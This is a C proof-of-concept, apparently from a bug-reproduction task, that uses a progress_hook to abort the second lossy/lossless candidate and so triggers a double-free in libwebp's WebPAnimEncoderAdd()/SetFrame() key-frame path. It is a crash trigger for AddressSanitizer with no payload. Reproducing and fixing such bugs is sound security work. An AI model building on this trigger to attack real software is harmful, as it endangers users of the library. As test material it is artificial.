// Residual double-free PoC for WebPAnimEncoderAdd()/SetFrame() on the
// key-frame path.
//
// Drives the public libwebp animation-encoder API (webp/mux.h) with a
// single key frame, requesting both lossless and lossy candidates
// (allow_mixed=1). A progress_hook on the input WebPPicture is used to let
// the first candidate's encode complete normally, then abort the second
// candidate's encode (a standard, documented use of progress_hook, e.g. to
// enforce a time budget). On the shipped tree this frees the winning
// (first) candidate's bitstream buffer twice: once from SetFrame()'s error
// cleanup, once later from FrameRelease(). On the golden tree (real
// upstream fix) this does not happen.
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "webp/encode.h"
#include "webp/mux.h"

static int g_completed_encodes = 0;

static int ProgressHook(int percent, const WebPPicture* picture) {
  (void)picture;
  if (g_completed_encodes >= 1) {
    // Abort every encode after the first one has fully completed. This
    // lands inside the second candidate's WebPEncode() call.
    return 0;
  }
  if (percent >= 100) {
    g_completed_encodes++;
  }
  return 1;
}

static void FillPicture(WebPPicture* pic) {
  int x, y;
  for (y = 0; y < pic->height; ++y) {
    uint32_t* row = (uint32_t*)(pic->argb + y * pic->argb_stride);
    for (x = 0; x < pic->width; ++x) {
      // A mix of colors so lossless and lossy both produce plausible,
      // differently-sized candidate bitstreams.
      uint8_t v = (uint8_t)((x * 37 + y * 53) & 0xFF);
      row[x] = (0xFFu << 24) | ((uint32_t)v << 16) |
               ((uint32_t)(v ^ 0x55) << 8) | (uint32_t)(v ^ 0xAA);
    }
  }
}

int main(void) {
  const int width = 32;
  const int height = 32;
  WebPAnimEncoderOptions anim_options;
  WebPConfig config;
  WebPPicture pic;
  WebPAnimEncoder* enc;
  WebPData webp_data;
  int ok;

  if (!WebPAnimEncoderOptionsInit(&anim_options)) {
    fprintf(stderr, "WebPAnimEncoderOptionsInit failed\n");
    return 1;
  }
  anim_options.allow_mixed = 1;
  anim_options.minimize_size = 1;  // Forces both lossless and lossy candidates.
  anim_options.kmax = 1;  // Force every frame to be considered a keyframe.
  anim_options.kmin = 0;

  if (!WebPConfigInit(&config)) {
    fprintf(stderr, "WebPConfigInit failed\n");
    return 1;
  }
  config.lossless = 0;
  config.quality = 50.0f;
  config.method = 0;

  if (!WebPPictureInit(&pic)) {
    fprintf(stderr, "WebPPictureInit failed\n");
    return 1;
  }
  pic.width = width;
  pic.height = height;
  pic.use_argb = 1;
  if (!WebPPictureAlloc(&pic)) {
    fprintf(stderr, "WebPPictureAlloc failed\n");
    return 1;
  }
  FillPicture(&pic);
  pic.progress_hook = ProgressHook;

  enc = WebPAnimEncoderNew(width, height, &anim_options);
  if (enc == NULL) {
    fprintf(stderr, "WebPAnimEncoderNew failed\n");
    return 1;
  }

  // First (and only) frame: is_key_frame == 1 in SetFrame(). allow_mixed
  // makes GenerateCandidates() try both a lossless and a lossy candidate;
  // the progress_hook lets the first succeed and aborts the second.
  ok = WebPAnimEncoderAdd(enc, &pic, 0, &config);
  // The call above is expected to fail (progress_hook aborted the second
  // candidate); the defect is a double free that happens internally while
  // handling that failure, which ASan reports before we get here.
  (void)ok;

  WebPDataInit(&webp_data);
  WebPAnimEncoderAdd(enc, NULL, 100, NULL);
  WebPAnimEncoderAssemble(enc, &webp_data);

  WebPDataClear(&webp_data);
  WebPAnimEncoderDelete(enc);
  WebPPictureFree(&pic);
  return 0;
}